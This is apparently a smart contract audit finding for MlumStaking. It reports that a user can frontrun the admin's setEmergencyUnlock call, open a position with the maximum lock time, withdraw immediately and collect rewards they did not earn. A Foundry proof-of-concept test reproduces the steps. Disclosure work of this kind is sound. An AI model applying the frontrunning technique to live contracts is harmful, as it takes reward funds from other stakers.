# Users can abuse `MlumStaking::setEmergencyUnlock` to steal tokens

## Summary

Users earn reward tokens by locking staking tokens inside the contract and setting a duration for their lock which impacts how big their rewards are going to be. By frontrunning the calling of `MlumStaking::setEmergencyUnlock` they can earn rewards they are not entitled to by creating a position with the maximum lock time and instantly withdrawing their funds afterwards.
## Vulnerability Detail

When a user creates a position they are immediately entitled to reward tokens when they create their lock based on the duration set by them instead of accumulating them over time. This can be exploited by waiting for the pool admin to call `setEmergencyUnlock(true)` and allow all users to withdraw their funds. Which means that a user can frontrun this call, create a position with the maximum lock time, and then withdraw all the funds they have deposited and earn staking rewards they were not supposed to receive.

## Impact
POC
```solidity
    function testEmeregencyWithdraw() public{

        _stakingToken.mint(ALICE, 1 ether);
        _stakingToken.mint(BOB, 2 ether);
        vm.startPrank(ALICE);
        _stakingToken.approve(address(_pool), 1 ether);
        _pool.createPosition(1 ether,365 days);
        vm.stopPrank();

        vm.startPrank(BOB);
        _stakingToken.approve(address(_pool), 2 ether);
        _pool.createPosition(2 ether,1 days);
        vm.stopPrank();

        _rewardToken.mint(address(_pool), 100_000_000); 

        vm.prank(DEV);
        _pool.setEmergencyUnlock(true);

        vm.startPrank(ALICE);
        _pool.withdrawFromPosition(1,1 ether);
        console.logUint(_rewardToken.balanceOf(ALICE));
        console.logUint(_stakingToken.balanceOf(ALICE));
        vm.stopPrank();

    }
```
